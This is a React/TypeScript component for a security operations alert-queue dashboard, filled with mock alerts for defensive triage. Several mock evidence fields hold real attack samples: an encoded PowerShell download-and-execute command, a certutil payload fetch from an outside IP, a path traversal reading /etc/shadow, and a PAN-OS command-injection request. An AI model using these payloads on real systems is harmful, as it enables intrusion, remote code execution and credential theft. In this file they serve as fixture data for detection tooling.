import { useMemo, useState } from "react";
import { cn } from "@/lib/utils";
import {
  Search, RefreshCw, Bell, User, X, ShieldAlert, FileText,
  Ban, ThumbsDown, Clock, Cpu, Activity, ChevronRight,
} from "lucide-react";
import SOCSidebar from "@/components/soc/SOCSidebar";

// ── Types ──────────────────────────────────────────────────────
type Severity = "Critical" | "High" | "Medium" | "Low";
type Status = "New" | "Investigating" | "Escalated" | "False Positive" | "Closed";

interface TimelineEntry { time: string; analyst: string; action: string; }

interface Alert {
  id: string;
  name: string;
  hostname: string;
  severity: Severity;
  status: Status;
  mitreId: string;
  mitreName: string;
  sourceIp: string;
  destIp: string;
  time: string;
  user: string;
  os: string;
  edrStatus: "Active" | "Degraded" | "Offline";
  evidence: string;
  timeline: TimelineEntry[];
}

// ── Mock Data ──────────────────────────────────────────────────
const alertsData: Alert[] = [
  {
    id: "SOC-R-1042", name: "PowerShell Encoded Command Execution", hostname: "WKS-PC-0127",
    severity: "Critical", status: "New", mitreId: "T1059.001", mitreName: "PowerShell",
    sourceIp: "10.0.0.42", destIp: "185.220.101.34", time: "14:32:18", user: "CORP\\jsmith",
    os: "Windows 11 Pro 23H2", edrStatus: "Active",
    evidence: "powershell.exe -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
    timeline: [
      { time: "14:32:18", analyst: "system", action: "Alert triggered by Sysmon Event ID 1" },
      { time: "14:33:02", analyst: "system", action: "Auto-enriched with VirusTotal (3/72 detections)" },
    ],
  },
  {
    id: "SOC-R-2018", name: "LSASS Memory Access — Credential Dumping", hostname: "WKS-PC-0089",
    severity: "Critical", status: "Investigating", mitreId: "T1003.001", mitreName: "LSASS Memory",
    sourceIp: "172.16.0.89", destIp: "172.16.0.1", time: "13:55:32", user: "NT AUTHORITY\\SYSTEM",
    os: "Windows 10 Enterprise", edrStatus: "Active",
    evidence: "Source: notepad.exe (PID 5544)\nTarget: lsass.exe (PID 712)\nGrantedAccess: 0x1010\nCallTrace: ntdll.dll+0x9c534 -> KERNELBASE.dll+0x2a3b1",
    timeline: [
      { time: "13:55:32", analyst: "system", action: "EDR flagged Mimikatz signature match" },
      { time: "13:58:11", analyst: "a.chen", action: "Acknowledged alert, opened investigation" },
      { time: "14:02:47", analyst: "a.chen", action: "Host quarantined via EDR console" },
    ],
  },
  {
    id: "SOC-R-3301", name: "CVE-2024-24919 Checkpoint Arbitrary File Read", hostname: "FW-GW-01",
    severity: "High", status: "Escalated", mitreId: "T1190", mitreName: "Exploit Public App",
    sourceIp: "45.33.32.156", destIp: "10.0.0.1", time: "11:22:04", user: "—",
    os: "Gaia R81.20", edrStatus: "Active",
    evidence: "POST /clients/MyCRL HTTP/1.1\nHost: vpn.corp.local\nUser-Agent: python-requests/2.28.1\nContent-Length: 39\n\naCSHELL/../../../../../../etc/shadow",
    timeline: [
      { time: "11:22:04", analyst: "system", action: "WAF detected path traversal pattern" },
      { time: "11:25:00", analyst: "m.rivera", action: "Confirmed exploit attempt, IP blocked at perimeter" },
      { time: "11:40:18", analyst: "m.rivera", action: "Escalated to IR team — Tier 2" },
    ],
  },
  {
    id: "SOC-R-1156", name: "RDP Brute Force from External IP", hostname: "DC-01",
    severity: "High", status: "Investigating", mitreId: "T1110.001", mitreName: "Password Guessing",
    sourceIp: "192.168.1.105", destIp: "10.0.0.10", time: "14:15:00", user: "admin_svc",
    os: "Windows Server 2022", edrStatus: "Active",
    evidence: "EventID: 4625 (x15)\nLogonType: 10 (RemoteInteractive)\nFailureReason: Unknown user or bad password\nIpAddress: 192.168.1.105\nTimeWindow: 14:12:00 - 14:15:00",
    timeline: [
      { time: "14:15:00", analyst: "system", action: "Threshold exceeded: 15 failures in 3 minutes" },
      { time: "14:16:42", analyst: "k.patel", action: "Source IP added to watchlist" },
    ],
  },
  {
    id: "SOC-R-4477", name: "Suspicious MX Record Change Detected", hostname: "DNS-SRV-01",
    severity: "Medium", status: "New", mitreId: "T1071.004", mitreName: "DNS",
    sourceIp: "203.0.113.50", destIp: "10.0.0.53", time: "09:44:12", user: "dns_admin",
    os: "Ubuntu 22.04 LTS", edrStatus: "Active",
    evidence: "RecordType: MX\nOldValue: mail.corp.local\nNewValue: mail.suspicious-domain.xyz\nSource: 203.0.113.50\nTTL: 300",
    timeline: [
      { time: "09:44:12", analyst: "system", action: "DNS audit log change detected" },
    ],
  },
  {
    id: "SOC-R-2204", name: "OAuth Token Enumeration Attempt", hostname: "APP-SRV-02",
    severity: "Medium", status: "Investigating", mitreId: "T1528", mitreName: "Steal App Token",
    sourceIp: "192.168.1.200", destIp: "10.0.0.80", time: "15:15:33", user: "webapp_svc",
    os: "RHEL 9.2", edrStatus: "Active",
    evidence: "GET /api/v2/auth/tokens?include=refresh HTTP/1.1\nHost: api.corp.local\nAuthorization: Bearer <redacted>\nResponse: 403 Forbidden",
    timeline: [
      { time: "15:15:33", analyst: "system", action: "API gateway flagged anomalous endpoint access" },
      { time: "15:18:00", analyst: "a.chen", action: "Reviewing service account scope" },
    ],
  },
  {
    id: "SOC-R-3309", name: "PAN-OS Command Injection Attempt", hostname: "PA-FW-01",
    severity: "Critical", status: "New", mitreId: "T1190", mitreName: "Exploit Public App",
    sourceIp: "91.215.85.17", destIp: "10.0.0.254", time: "08:12:55", user: "—",
    os: "PAN-OS 11.0", edrStatus: "Active",
    evidence: "POST /php/utils/router.php HTTP/1.1\nHost: mgmt.corp.local\nContent-Type: application/x-www-form-urlencoded\n\ncmd=%60id%60",
    timeline: [
      { time: "08:12:55", analyst: "system", action: "IPS signature CVE-2024-3400 matched" },
    ],
  },
  {
    id: "SOC-R-5012", name: "Macro-Enabled Document Spawned Shell", hostname: "WKS-PC-0156",
    severity: "Medium", status: "Investigating", mitreId: "T1204.002", mitreName: "Malicious File",
    sourceIp: "10.0.0.156", destIp: "91.215.85.17", time: "11:42:17", user: "CORP\\mgarcia",
    os: "Windows 11 Pro", edrStatus: "Active",
    evidence: "ParentImage: WINWORD.EXE\nImage: cmd.exe\nCommandLine: cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe\nFile: Invoice-Q4-2025.docm",
    timeline: [
      { time: "11:42:17", analyst: "system", action: "Suspicious parent-child process chain detected" },
      { time: "11:50:30", analyst: "k.patel", action: "Email source identified, quarantined" },
    ],
  },
  {
    id: "SOC-R-6601", name: "Anomalous Outbound Traffic to TOR Exit Node", hostname: "WKS-PC-0204",
    severity: "Low", status: "False Positive", mitreId: "T1090.003", mitreName: "Multi-hop Proxy",
    sourceIp: "10.0.0.204", destIp: "176.10.99.200", time: "10:08:44", user: "CORP\\rsingh",
    os: "Windows 11 Pro", edrStatus: "Active",
    evidence: "Connection: 10.0.0.204:51234 -> 176.10.99.200:9001\nProcess: torbrowser.exe\nBytesSent: 12.4 KB\nDuration: 8s",
    timeline: [
      { time: "10:08:44", analyst: "system", action: "Destination matched TOR exit node list" },
      { time: "10:30:11", analyst: "m.rivera", action: "User confirmed personal research, marked FP" },
    ],
  },
  {
    id: "SOC-R-7720", name: "Service Account Login from Unusual Geo", hostname: "AUTH-SRV-01",
    severity: "Low", status: "Closed", mitreId: "T1078.003", mitreName: "Local Accounts",
    sourceIp: "203.0.113.99", destIp: "10.0.0.20", time: "07:01:09", user: "svc_backup",
    os: "Windows Server 2019", edrStatus: "Active",
    evidence: "EventID: 4624\nLogonType: 3 (Network)\nGeoIP: Singapore (expected: US-East)\nResult: Success",
    timeline: [
      { time: "07:01:09", analyst: "system", action: "GeoIP anomaly detected" },
      { time: "08:15:00", analyst: "a.chen", action: "Verified scheduled backup window, closed" },
    ],
  },
];

// ── Styling Maps ──────────────────────────────────────────────
const sevBadge: Record<Severity, string> = {
  Critical: "bg-red-500/15 text-red-400 border-red-500/30",
  High:     "bg-yellow-500/15 text-yellow-400 border-yellow-500/30",
  Medium:   "bg-orange-500/15 text-orange-400 border-orange-500/30",
  Low:      "bg-green-500/15 text-green-400 border-green-500/30",
};

const sevBorder: Record<Severity, string> = {
  Critical: "border-l-red-500",
  High:     "border-l-yellow-500",
  Medium:   "border-l-orange-500",
  Low:      "border-l-green-500",
};

const statusBadge: Record<Status, string> = {
  "New":            "bg-blue-500/15 text-blue-400 border-blue-500/30",
  "Investigating":  "bg-purple-500/15 text-purple-400 border-purple-500/30",
  "Escalated":      "bg-pink-500/15 text-pink-400 border-pink-500/30",
  "False Positive": "bg-zinc-500/15 text-zinc-400 border-zinc-500/30",
  "Closed":         "bg-emerald-500/15 text-emerald-400 border-emerald-500/30",
};

// ── Component ──────────────────────────────────────────────────
const Alerts = () => {
  const [selected, setSelected] = useState<Alert | null>(alertsData[0]);
  const [checked, setChecked] = useState<Set<string>>(new Set());
  const [search, setSearch] = useState("");
  const [sevFilter, setSevFilter] = useState<"All" | Severity>("All");

  const filtered = useMemo(() => {
    return alertsData.filter(a => {
      if (sevFilter !== "All" && a.severity !== sevFilter) return false;
      if (search) {
        const q = search.toLowerCase();
        if (![a.id, a.name, a.hostname, a.mitreId, a.sourceIp].some(f => f.toLowerCase().includes(q))) return false;
      }
      return true;
    });
  }, [search, sevFilter]);

  const stats = useMemo(() => ({
    total: alertsData.length,
    critical: alertsData.filter(a => a.severity === "Critical").length,
    high: alertsData.filter(a => a.severity === "High").length,
    medium: alertsData.filter(a => a.severity === "Medium").length,
    low: alertsData.filter(a => a.severity === "Low").length,
  }), []);

  const toggleCheck = (id: string) => {
    setChecked(prev => {
      const n = new Set(prev);
      if (n.has(id)) n.delete(id); else n.add(id);
      return n;
    });
  };

  return (
    <div className="min-h-screen bg-[#0d1117] text-zinc-300 flex font-sans">
      <SOCSidebar activeItem="Alerts" />

      <div className="flex-1 flex flex-col min-w-0">
        {/* ─── Top Header ─── */}
        <header className="h-14 px-6 border-b border-white/[0.06] bg-[#0d1117] flex items-center justify-between shrink-0">
          <div className="flex items-center gap-4">
            <h1 className="text-base font-semibold text-white tracking-tight">Alert Queue</h1>
            <div className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-green-500/10 border border-green-500/30">
              <span className="relative flex h-1.5 w-1.5">
                <span className="absolute inline-flex h-full w-full rounded-full bg-green-500 opacity-75 animate-ping" />
                <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-green-500" />
              </span>
              <span className="text-[10px] font-medium text-green-400 uppercase tracking-wider">Live</span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <div className="relative">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-500" />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search rule, host, IP, MITRE..."
                className="w-72 h-8 pl-8 pr-3 text-xs bg-[#161b22] border border-white/[0.08] rounded-md text-zinc-300 placeholder:text-zinc-500 focus:outline-none focus:border-blue-500/50"
              />
            </div>
            <button className="p-1.5 text-zinc-500 hover:text-zinc-300 transition-colors"><RefreshCw className="w-4 h-4" /></button>
            <button className="relative p-1.5 text-zinc-500 hover:text-zinc-300 transition-colors">
              <Bell className="w-4 h-4" />
              <span className="absolute top-1 right-1 w-1.5 h-1.5 bg-red-500 rounded-full" />
            </button>
            <div className="w-7 h-7 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center text-blue-400">
              <User className="w-3.5 h-3.5" />
            </div>
          </div>
        </header>

        {/* ─── Stats Bar ─── */}
        <div className="px-6 py-4 border-b border-white/[0.06] bg-[#0d1117] flex items-center gap-3 shrink-0 overflow-x-auto">
          <StatCard label="Total Alerts" value={stats.total} accent="text-white" />
          <StatCard label="Critical" value={stats.critical} accent="text-red-400" dot="bg-red-500" />
          <StatCard label="High" value={stats.high} accent="text-yellow-400" dot="bg-yellow-500" />
          <StatCard label="Medium" value={stats.medium} accent="text-orange-400" dot="bg-orange-500" />
          <StatCard label="Low" value={stats.low} accent="text-green-400" dot="bg-green-500" />
          <div className="flex-1" />
          <StatCard label="MTTR" value="00:14:22" accent="text-blue-400" suffix="avg" />
          <StatCard label="MTTD" value="00:02:48" accent="text-cyan-400" suffix="avg" />
        </div>

        {/* ─── Filter Bar ─── */}
        <div className="px-6 py-2.5 border-b border-white/[0.06] bg-[#0d1117] flex items-center gap-2 shrink-0">
          {(["All", "Critical", "High", "Medium", "Low"] as const).map(s => (
            <button
              key={s}
              onClick={() => setSevFilter(s)}
              className={cn(
                "px-2.5 py-1 text-[11px] font-medium rounded border transition-colors",
                sevFilter === s
                  ? "bg-white/[0.06] text-white border-white/20"
                  : "bg-transparent text-zinc-500 border-white/[0.08] hover:text-zinc-300 hover:border-white/15"
              )}
            >
              {s}
            </button>
          ))}
          <span className="ml-auto text-[11px] text-zinc-500">
            {filtered.length} of {alertsData.length} alerts · {checked.size} selected
          </span>
        </div>

        {/* ─── Body: Table + Detail Panel ─── */}
        <div className="flex-1 flex min-h-0">
          {/* Table */}
          <div className="flex-1 overflow-auto">
            <table className="w-full text-xs">
              <thead className="sticky top-0 bg-[#161b22] z-10 border-b border-white/[0.08]">
                <tr className="text-left text-[10px] uppercase tracking-wider text-zinc-500">
                  <th className="w-8 px-3 py-2.5"></th>
                  <th className="px-2 py-2.5 font-medium">Rule ID</th>
                  <th className="px-2 py-2.5 font-medium">Severity</th>
                  <th className="px-2 py-2.5 font-medium">Status</th>
                  <th className="px-2 py-2.5 font-medium">Alert / Host</th>
                  <th className="px-2 py-2.5 font-medium">MITRE</th>
                  <th className="px-2 py-2.5 font-medium">Source IP</th>
                  <th className="px-2 py-2.5 font-medium">Time</th>
                  <th className="w-10 px-2 py-2.5"></th>
                </tr>
              </thead>
              <tbody>
                {filtered.map((a) => {
                  const isSelected = selected?.id === a.id;
                  return (
                    <tr
                      key={a.id}
                      onClick={() => setSelected(a)}
                      className={cn(
                        "border-b border-white/[0.04] cursor-pointer transition-colors border-l-2",
                        sevBorder[a.severity],
                        isSelected ? "bg-blue-500/[0.07]" : "hover:bg-white/[0.025]"
                      )}
                    >
                      <td className="px-3 py-2.5" onClick={(e) => e.stopPropagation()}>
                        <input
                          type="checkbox"
                          checked={checked.has(a.id)}
                          onChange={() => toggleCheck(a.id)}
                          className="w-3.5 h-3.5 accent-blue-500 bg-transparent"
                        />
                      </td>
                      <td className="px-2 py-2.5 font-mono text-[11px] text-zinc-400">{a.id}</td>
                      <td className="px-2 py-2.5">
                        <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-semibold rounded border uppercase tracking-wide", sevBadge[a.severity])}>
                          {a.severity}
                        </span>
                      </td>
                      <td className="px-2 py-2.5">
                        <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-medium rounded border", statusBadge[a.status])}>
                          {a.status}
                        </span>
                      </td>
                      <td className="px-2 py-2.5">
                        <div className="text-zinc-200 font-medium leading-tight">{a.name}</div>
                        <div className="text-[10px] text-zinc-500 font-mono mt-0.5">{a.hostname}</div>
                      </td>
                      <td className="px-2 py-2.5">
                        <div className="font-mono text-[11px] text-blue-400">{a.mitreId}</div>
                        <div className="text-[10px] text-zinc-500">{a.mitreName}</div>
                      </td>
                      <td className="px-2 py-2.5 font-mono text-[11px] text-zinc-400">{a.sourceIp}</td>
                      <td className="px-2 py-2.5 font-mono text-[11px] text-zinc-500">{a.time}</td>
                      <td className="px-2 py-2.5">
                        <button className="px-2 py-1 text-[10px] font-medium text-blue-400 hover:bg-blue-500/10 rounded border border-blue-500/30 transition-colors">
                          Triage
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {/* Detail Panel */}
          {selected && <DetailPanel alert={selected} onClose={() => setSelected(null)} />}
        </div>
      </div>
    </div>
  );
};

// ── Sub-components ─────────────────────────────────────────────
const StatCard = ({ label, value, accent, dot, suffix }: { label: string; value: string | number; accent: string; dot?: string; suffix?: string }) => (
  <div className="bg-[#161b22] border border-white/[0.06] rounded-md px-3.5 py-2 min-w-[110px]">
    <div className="flex items-center gap-1.5 text-[10px] text-zinc-500 uppercase tracking-wider font-medium">
      {dot && <span className={cn("w-1.5 h-1.5 rounded-full", dot)} />}
      {label}
    </div>
    <div className={cn("text-lg font-semibold font-mono mt-0.5", accent)}>
      {value}
      {suffix && <span className="text-[10px] text-zinc-500 font-sans font-normal ml-1">{suffix}</span>}
    </div>
  </div>
);

const DetailPanel = ({ alert, onClose }: { alert: Alert; onClose: () => void }) => (
  <aside className="w-[420px] shrink-0 border-l border-white/[0.08] bg-[#0d1117] flex flex-col overflow-hidden">
    {/* Header */}
    <div className="px-5 py-4 border-b border-white/[0.08]">
      <div className="flex items-start justify-between gap-3">
        <div className="min-w-0">
          <div className="flex items-center gap-2 mb-1.5">
            <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-semibold rounded border uppercase", sevBadge[alert.severity])}>
              {alert.severity}
            </span>
            <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-medium rounded border", statusBadge[alert.status])}>
              {alert.status}
            </span>
            <span className="font-mono text-[10px] text-zinc-500">{alert.id}</span>
          </div>
          <h2 className="text-sm font-semibold text-white leading-snug">{alert.name}</h2>
        </div>
        <button onClick={onClose} className="text-zinc-500 hover:text-zinc-300 transition-colors p-1 -m-1">
          <X className="w-4 h-4" />
        </button>
      </div>
    </div>

    <div className="flex-1 overflow-auto">
      {/* Host Context */}
      <Section title="Host Context" icon={<Cpu className="w-3.5 h-3.5" />}>
        <KV k="Hostname" v={alert.hostname} mono />
        <KV k="Source IP" v={alert.sourceIp} mono />
        <KV k="Destination IP" v={alert.destIp} mono />
        <KV k="User" v={alert.user} mono />
        <KV k="OS" v={alert.os} />
        <KV k="EDR Status" v={
          <span className="inline-flex items-center gap-1.5 text-green-400">
            <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
            {alert.edrStatus}
          </span>
        } />
      </Section>

      {/* MITRE */}
      <Section title="MITRE ATT&CK" icon={<ShieldAlert className="w-3.5 h-3.5" />}>
        <div className="bg-[#161b22] border border-white/[0.06] rounded p-2.5">
          <div className="flex items-center gap-2 mb-1">
            <span className="font-mono text-[11px] font-semibold text-blue-400">{alert.mitreId}</span>
            <ChevronRight className="w-3 h-3 text-zinc-600" />
            <span className="text-[11px] text-zinc-300">{alert.mitreName}</span>
          </div>
          <div className="text-[10px] text-zinc-500">Tactic: Execution · Defense Evasion</div>
        </div>
      </Section>

      {/* Evidence */}
      <Section title="Raw Evidence" icon={<FileText className="w-3.5 h-3.5" />}>
        <pre className="bg-[#010409] border border-white/[0.06] rounded p-2.5 text-[10.5px] font-mono text-zinc-300 leading-relaxed overflow-x-auto whitespace-pre-wrap break-all max-h-48 overflow-y-auto">
          {alert.evidence}
        </pre>
      </Section>

      {/* Timeline */}
      <Section title="Analyst Timeline" icon={<Clock className="w-3.5 h-3.5" />}>
        <ol className="space-y-2 relative pl-4 border-l border-white/[0.08] ml-1">
          {alert.timeline.map((t, i) => (
            <li key={i} className="relative">
              <span className="absolute -left-[18px] top-1 w-2 h-2 rounded-full bg-blue-500 ring-2 ring-[#0d1117]" />
              <div className="text-[10px] text-zinc-500 font-mono">{t.time} · {t.analyst}</div>
              <div className="text-[11px] text-zinc-300 mt-0.5">{t.action}</div>
            </li>
          ))}
        </ol>
      </Section>
    </div>

    {/* Action Bar */}
    <div className="border-t border-white/[0.08] p-3 grid grid-cols-2 gap-2 shrink-0 bg-[#0d1117]">
      <ActionBtn icon={<Activity className="w-3.5 h-3.5" />} label="Escalate to IR" variant="primary" />
      <ActionBtn icon={<FileText className="w-3.5 h-3.5" />} label="Add Note" />
      <ActionBtn icon={<Ban className="w-3.5 h-3.5" />} label="Isolate Host" variant="danger" />
      <ActionBtn icon={<ThumbsDown className="w-3.5 h-3.5" />} label="False Positive" />
    </div>
  </aside>
);

const Section = ({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) => (
  <div className="px-5 py-3.5 border-b border-white/[0.06]">
    <div className="flex items-center gap-1.5 text-[10px] uppercase tracking-wider text-zinc-500 font-medium mb-2.5">
      {icon}
      {title}
    </div>
    <div className="space-y-1.5">{children}</div>
  </div>
);

const KV = ({ k, v, mono }: { k: string; v: React.ReactNode; mono?: boolean }) => (
  <div className="flex items-start justify-between gap-3 text-[11px]">
    <span className="text-zinc-500 shrink-0">{k}</span>
    <span className={cn("text-zinc-200 text-right", mono && "font-mono text-[10.5px]")}>{v}</span>
  </div>
);

const ActionBtn = ({ icon, label, variant }: { icon: React.ReactNode; label: string; variant?: "primary" | "danger" }) => (
  <button className={cn(
    "flex items-center justify-center gap-1.5 px-2 py-2 text-[11px] font-medium rounded border transition-colors",
    variant === "primary" && "bg-blue-500/15 text-blue-400 border-blue-500/30 hover:bg-blue-500/25",
    variant === "danger" && "bg-red-500/10 text-red-400 border-red-500/30 hover:bg-red-500/20",
    !variant && "bg-[#161b22] text-zinc-300 border-white/[0.08] hover:border-white/20"
  )}>
    {icon}
    {label}
  </button>
);

export default Alerts;
